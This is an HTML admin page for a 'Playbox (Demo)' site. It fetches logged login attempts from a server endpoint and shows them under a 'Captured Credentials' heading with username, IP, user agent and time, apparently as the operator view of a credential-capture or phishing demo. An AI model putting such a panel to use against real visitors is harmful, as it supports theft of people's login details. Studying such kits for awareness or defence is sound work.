<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Admin â€” Playbox (Demo)</title>
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <header class="topbar">
      <div class="container topbar-inner">
        <a class="brand" href="index.html">
          <img src="assets/logo.svg" alt="Playbox" />
          <span>Playbox Admin</span>
        </a>
      </div>
    </header>

    <main style="padding:120px 24px 48px;max-width:900px;margin:0 auto;">
      <h1>Admin Page (Demo)</h1>
      <p>This is a local demo admin page. Implement proper authentication before using in production.</p>

      <!-- Admin attempts (fetched from server) -->
      <div id="adminInfo" style="margin-top:18px;background:#fff;padding:12px;border-radius:8px;border:1px solid #eee;max-width:920px;">
        <p id="adminNote" style="color:#6b7280;margin-top:0">Attempts are fetched from the server. Ensure the server is running and you are authorized.</p>
      </div>

      <section id="creds" style="margin-top:18px;background:#fff;padding:12px;border-radius:8px;border:1px solid #eee;display:block">
        <h2>Captured Credentials (demo)</h2>
        <p id="no-creds">No credentials captured yet. Submit the login form to view them here.</p>
        <dl id="creds-list" style="display:none;margin:8px 0 0">
          <dt style="font-weight:700">Username</dt>
          <dd id="c-user" style="margin:6px 0 12px;color:#111"></dd>
          <dt style="font-weight:700">Password</dt>
          <dd id="c-pass" style="margin:6px 0 12px;color:#111;word-break:break-all"></dd>
        </dl>
      </section>

      <script>
        // Fetch attempts from server and render them immediately
        (async function(){
          const credsSection = document.getElementById('creds');
          const noCreds = document.getElementById('no-creds');
          const credsList = document.getElementById('creds-list');
          const adminInfo = document.getElementById('adminInfo');
          try{
            const res = await fetch('/api/admin/attempts');
            if(!res.ok){
              adminInfo.innerHTML = '<p style="color:#b91c1c">Unable to fetch attempts (unauthorized or server not running).</p>';
              return;
            }
            const j = await res.json();
            if(j && j.ok && j.attempts && j.attempts.length){
              noCreds.style.display = 'none';
              credsList.style.display = 'block';
              const first = j.attempts[0];
              document.getElementById('c-user').textContent = first.username || '(empty)';
              document.getElementById('c-pass').textContent = new Date(first.createdAt).toLocaleString() || '(time)';
              const table = document.createElement('table');
              table.style.width='100%';
              table.style.marginTop='12px';
              table.innerHTML = '<thead><tr><th>User</th><th>IP</th><th>Agent</th><th>When</th></tr></thead>' +
                '<tbody>' + j.attempts.map(a=>`<tr><td>${escapeHtml(a.username)}</td><td>${escapeHtml(a.ip||'')}</td><td>${escapeHtml((a.ua||'').slice(0,40))}</td><td>${new Date(a.createdAt).toLocaleString()}</td></tr>`).join('') + '</tbody>';
              credsSection.appendChild(table);
              adminInfo.innerHTML = '<p style="color:green">Loaded ' + j.attempts.length + ' attempts.</p>';
            } else {
              noCreds.style.display = 'block';
              credsList.style.display = 'none';
              adminInfo.innerHTML = '<p>No attempts found.</p>';
            }
          }catch(e){
            adminInfo.innerHTML = '<p style="color:#b91c1c">Error fetching attempts.</p>';
            console.error(e);
          }
        })();
        function escapeHtml(s){ return (s||'').replace(/[&<>"']/g, c=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;" })[c]); }
      </script>
    </main>
  </body>
</html>
